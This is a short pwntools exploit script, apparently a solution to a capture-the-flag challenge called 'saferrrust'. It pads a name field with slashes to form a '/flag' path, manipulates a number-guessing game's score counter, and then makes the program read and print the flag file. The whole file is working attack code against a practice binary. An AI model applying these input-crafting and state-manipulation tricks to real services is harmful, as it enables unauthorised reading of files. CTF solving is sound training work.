from pwn import *

if args.REMOTE:
	r = remote('', 1337)
else:
	r = process('./saferrrust')


name = b'/'*6 + b'/flag'.rjust(9, b'/')*3
r.sendlineafter(b'name:', name)

r.sendlineafter(b'4) Exit', b'2\n0')

points = 0
while points != 128:
	r.sendlineafter(b'4) Exit', b'1')
	r.recvuntil(b'between ')
	lower = int(r.recvuntil(b' ').strip().decode())
	r.recvuntil(b'and ')
	upper = int(r.recvuntil(b' ').strip().decode())
	r.recvline()

	if points <= 28:
		r.sendline(str(lower + 1).encode())
	elif points > 28:
		r.sendline(str(upper).encode())

	guess = r.recvuntil(b' Number!', drop=True)
	if guess[-5:] == b'Wrong':
		points -= 1
	else:
		points += 100
	print(points)


r.sendlineafter(b'4) Exit', b'3\n1')

r.sendlineafter(b'4) Exit', b'1')
flag = r.recvuntil(b'! Your current score is', drop=True)
r.close()

flag = flag.split(b'Hello ')[1].decode()
print(flag)


